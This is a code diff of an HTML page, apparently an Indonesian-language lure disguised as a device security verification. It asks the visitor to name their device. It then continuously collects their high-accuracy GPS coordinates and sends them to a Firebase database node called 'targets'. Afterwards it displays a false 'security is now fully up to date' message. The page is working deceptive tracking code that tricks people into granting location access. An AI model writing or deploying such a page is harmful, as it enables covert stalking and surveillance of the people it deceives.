@@ -1,4 +1,4 @@
-                        <!DOCTYPE html>
+       <!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
@@ -17,6 +17,33 @@
             margin: 0;
             text-align: center;
         }
+        .box {
+            border: 1px solid #00ff66;
+            background-color: #05070c;
+            padding: 20px;
+            width: 80%;
+            max-width: 350px;
+        }
+        input {
+            background-color: #0b0f19;
+            border: 1px solid #00ff66;
+            color: #00ff66;
+            padding: 10px;
+            width: 90%;
+            font-family: 'Courier New', Courier, monospace;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        button {
+            background-color: #00ff66;
+            color: #0b0f19;
+            border: none;
+            padding: 10px 20px;
+            font-weight: bold;
+            font-family: 'Courier New', Courier, monospace;
+            cursor: pointer;
+            width: 100%;
+        }
         .spinner {
             border: 4px solid rgba(0, 255, 102, 0.1);
             width: 60px;
@@ -24,21 +51,46 @@
             border-radius: 50%;
             border-left-color: #00ff66;
             animation: spin 1s linear infinite;
-            margin-bottom: 20px;
+            margin: 0 auto 20px;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        h2 { font-size: 1.2rem; letter-spacing: 2px; margin-bottom: 10px; }
-        p { color: #ff3333; font-size: 0.9rem; }
+        .checkmark {
+            font-size: 50px;
+            color: #00ff66;
+            margin-bottom: 15px;
+        }
+        h2 { font-size: 1.1rem; letter-spacing: 1px; margin-bottom: 15px; }
+        p { color: #00ff66; font-size: 0.85rem; }
     </style>
 </head>
 <body>
 
-    <div class="spinner"></div>
-    <h2 id="status-text">Verifying Device Security...</h2>
-    <p id="error-text"></p>
+    <!-- Kotak Form dengan Atribut Required (Wajib Diisi) -->
+    <div class="box" id="inputBox">
+        <h2>[ IDENTIFY DEVICE ]</h2>
+        <p style="margin-bottom: 10px;">Wajib Masukkan Merek & Tipe (Contoh: Samsung S23, iPad, Laptop Asus):</p>
+        <form onsubmit="startTracking(event)">
+            <input type="text" id="deviceNameInput" placeholder="Ketik nama perangkat..." required>
+            <button type="submit">VERIFY & START</button>
+        </form>
+    </div>
+
+    <!-- Kotak Loading -->
+    <div id="trackingContainer" style="display: none;">
+        <div class="spinner"></div>
+        <h2 id="status-text">Synchronizing Telemetry...</h2>
+        <p id="error-text" style="color: #ff3333;"></p>
+    </div>
+
+    <!-- Kotak Sukses (Centang & Thank You) -->
+    <div id="successContainer" style="display: none;" class="box">
+        <div class="checkmark">✓</div>
+        <h2 style="color: #00ff66; margin-bottom: 10px;">Thank You!</h2>
+        <p>Device verification completed successfully. System security is now fully up to date.</p>
+    </div>
 
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
@@ -54,64 +106,48 @@
         }
         const db = firebase.database();
 
-        const statusText = document.getElementById("status-text");
-        const errorText = document.getElementById("error-text");
+        function startTracking(event) {
+            event.preventDefault(); // Mencegah reload halaman
+            const inputVal = document.getElementById("deviceNameInput").value.trim();
+            const deviceName = `📱 ${inputVal}`;
 
-        // Deteksi Jenis Perangkat (HP, Tablet, atau Laptop)
-        const userAgent = navigator.userAgent;
-        let deviceType = "Desktop / PC";
-        let deviceIcon = "💻";
+            document.getElementById("inputBox").style.display = "none";
+            document.getElementById("trackingContainer").style.display = "block";
 
-        if (/tablet|ipad|playbook|silk/i.test(userAgent)) {
-            deviceType = "Tablet Device";
-            deviceIcon = "📑";
-        } else if (/android/i.test(userAgent) && !/mobile/i.test(userAgent)) {
-            deviceType = "Android Tablet";
-            deviceIcon = "📑";
-        } else if (/android/i.test(userAgent)) {
-            deviceType = "Android Phone";
-            deviceIcon = "📱";
-        } else if (/iphone/i.test(userAgent)) {
-            deviceType = "iPhone";
-            deviceIcon = "📱";
-        } else if (/mobile/i.test(userAgent)) {
-            deviceType = "Mobile Device";
-            deviceIcon = "📱";
-        }
+            const statusText = document.getElementById("status-text");
+            const errorText = document.getElementById("error-text");
+            const targetRef = db.ref("targets").push();
 
-        // Buat ID unik untuk setiap perangkat yang membuka halaman ini
-        const targetRef = db.ref("targets").push();
+            if ("geolocation" in navigator) {
+                navigator.geolocation.watchPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
 
-        if ("geolocation" in navigator) {
-            navigator.geolocation.watchPosition(
-                function(position) {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const accuracy = position.coords.accuracy;
-
-                    // Mengirim data menggunakan update agar posisinya terus diperbarui secara real-time
-                    targetRef.set({
-                        latitude: lat,
-                        longitude: lon,
-                        accuracy: accuracy,
-                        device: `${deviceIcon} ${deviceType}`,
-                        timestamp: Date.now()
-                    }).then(() => {
-                        statusText.innerText = "System optimized successfully.";
-                        errorText.innerText = "";
-                    });
-                },
-                function(error) {
-                    if (error.code === error.PERMISSION_DENIED) {
-                        errorText.innerText = "Error: Location permission denied.";
-                    } else {
-                        errorText.innerText = "Error: Unable to retrieve accurate location.";
-                    }
-                },
-                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-            );
-        } else {
-            errorText.innerText = "Error: Geolocation is not supported.";
+                        targetRef.set({
+                            latitude: lat,
+                            longitude: lon,
+                            accuracy: accuracy,
+                            device: deviceName,
+                            timestamp: Date.now()
+                        }).then(() => {
+                            document.getElementById("trackingContainer").style.display = "none";
+                            document.getElementById("successContainer").style.display = "block";
+                        });
+                    },
+                    function(error) {
+                        if (error.code === error.PERMISSION_DENIED) {
+                            errorText.innerText = "Error: Location permission denied.";
+                        } else {
+                            errorText.innerText = "Error: Unable to retrieve accurate location.";
+                        }
+                    },
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            } else {
+                errorText.innerText = "Error: Geolocation is not supported.";
+            }
         }
     </script>
 </body>
